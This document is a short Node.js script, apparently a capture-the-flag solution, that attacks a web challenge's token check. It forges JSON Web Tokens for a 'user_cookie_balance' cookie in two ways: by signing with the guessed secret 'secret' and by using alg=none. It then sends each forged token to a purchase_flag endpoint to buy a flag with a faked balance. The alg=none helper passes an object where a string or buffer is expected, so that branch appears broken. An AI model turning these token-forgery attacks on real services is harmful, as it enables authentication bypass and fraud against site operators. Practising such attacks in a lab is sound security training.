const crypto = require('crypto');
const B = 'https://xhlvnfzc.i.cdctf.net';

const b64u = (b) => Buffer.from(b).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const hs = (o) => crypto.createHmac('sha256', o.secret).update(o.h).digest();

function sign(payload, secret) {
  const h = b64u(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const p = b64u(JSON.stringify(payload));
  const s = Buffer.from(hs({ secret, h: `${h}.${p}` })).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  return `${h}.${p}.${s}`;
}

function none(payload) {
  const h = b64u(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  return `${h}.${b64u(payload)}.`;
}

async function buy(token, label) {
  const headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
  if (token) headers.Cookie = `user_cookie_balance=${token}`;
  const r = await fetch(`${B}/purchase_flag`, { method: 'POST', headers, body: '', redirect: 'manual' });
  const t = await r.text();
  const one = t.replace(/\s+/g, ' ').replace(/<[^>]+>/g, ' ').trim().slice(0, 260);
  console.log(`[${r.status}] ${label} -> ${one}`);
  return { status: r.status, body: t };
}

module.exports = { sign, none, buy, B };

if (require.main === module) {
  const ORIG = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjowfQ.tZeCDGDWQMirKqWJ3tx3r4rmxSaFTPmOqFgU-Koq8Xg';
  (async () => {
    await buy(null, 'no-cookie');
    await buy(ORIG, 'orig balance=0');
    await buy(sign({ user_cookie_balance: 1 }, 'secret'), 'HS256 secret=secret');
    await buy(none({ user_cookie_balance: 1 }), 'alg=none');
  })();
}
